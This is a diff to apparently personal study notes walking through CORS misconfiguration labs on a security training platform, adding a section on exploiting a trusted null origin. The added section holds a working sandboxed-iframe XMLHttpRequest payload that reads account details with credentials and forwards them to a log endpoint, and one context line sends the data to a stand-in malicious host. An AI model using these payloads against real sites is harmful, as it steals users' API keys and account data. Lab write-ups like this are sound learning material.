@@ -37,7 +37,7 @@ location='malicious-website.com/log?key='+this.responseText;
 
 ## Labs Walkthrough
 
-### Basic Origin Reflection Attack
+### CORS Vulnerability with Basic Origin Reflection Attack
 
 - log into application and review the request to /accountDetails
 - notice the usage of the `Access-Control-Allow-Origin` header, suggesting the usage of CORS
@@ -61,6 +61,32 @@ location='/log?key='+this.responseText;
 ```
 
 - after storing and delivering to the victim, go to access log to find the api key to submit
+
+### CORS Vulnerability with trusted null origin
+
+- again login with creds and view the login and notice the `/accountDetails` page
+- you can add null in this request to validate that it does accept null and `Access-Control-Allow-Credentials` is set to true
+- ![image](https://github.com/user-attachments/assets/8ee159ca-75a2-4259-ab7d-9a4f12440cf1)
+- now craft exploit to abuse, using sample from methodology above
+
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','0a74004304f82b2983e2d8ec00d8009c.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='/log?key='+this.responseText;
+};
+</script>"></iframe>
+```
+
+- 
+
+
+
 
 
 
